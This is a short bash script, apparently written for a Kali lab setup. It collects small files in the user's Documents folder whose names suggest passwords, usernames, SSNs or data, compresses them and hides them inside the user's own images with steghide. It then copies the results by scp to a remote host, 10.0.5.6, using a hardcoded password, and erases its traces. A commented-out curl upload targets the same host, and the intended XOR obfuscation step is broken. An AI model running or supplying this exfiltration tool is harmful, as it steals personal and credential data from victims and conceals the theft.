wuser=$(whoami)
OUT_DIR="/home/$wuser/Documents/temp"
mkdir -p "$OUT_DIR"
KALI_PASS="kali"


mapfile -d $'\0' IMG_FILES < <(find "/home/$wuser/Pictures" -type f -size +100k \( -name "*.jpg" -o -name "*.png" \) -print0)
mapfile -d $'\0' DOC_FILES < <(find "/home/$wuser/Documents" -type f -size -25k \( -name "*password*" -o -name "*username*" -o -name "*ssn*" -o -name "*data*" \) -print0)

GZIP_DOC_FILES=()


for file in "${DOC_FILES[@]}"; do
    echo "Compressing: $file"
    base_name="$(basename "$file")"
    out_file="$OUT_DIR/$base_name.gz"
    perl -0777pe '$_ ^= "\x2A" x length' "$file" | gzip -9 -c "$file" > "$out_file"
    GZIP_DOC_FILES+=("$out_file")
done

STEG_FILES=()

for i in "${!GZIP_DOC_FILES[@]}"; do
 
    [[ -z "${IMG_FILES[$i]}" ]] && break

    out_name="$(basename "${GZIP_DOC_FILES[$i]}")_steg"
    out_path="$OUT_DIR/$out_name"


    steghide embed -cf "${IMG_FILES[$i]}" -ef "${GZIP_DOC_FILES[$i]}" -p "" -sf "$out_path"

    STEG_FILES+=("$out_path")
done

mapfile -t STEG_FILES < <(find "$OUT_DIR" -type f -name "*_steg")

for j in "${STEG_FILES[@]}"; do
    echo "Created: $j"
done

echo "Images: ${#IMG_FILES[@]}"
echo "Docs: ${#DOC_FILES[@]}"
echo "Gzips: ${#GZIP_DOC_FILES[@]}"
echo "Concatenated: ${#STEG_FILES[@]}"

echo "Starting automated transfer to host..."

for file in "${STEG_FILES[@]}"; do
	#curl --user "kali:${KALI_PASS}" -T "$file" "http://10.0.5.6/home/kali/Desktop/$(basename "$file")" --fail --show-error
#done


expect <<EOF
spawn scp "$file" kali@10.0.5.6:/home/kali/Desktop/
expect "password:"
send "$KALI_PASS\r"
expect eof
EOF
done

rm -rf "$OUT_DIR"

echo "Transfer complete."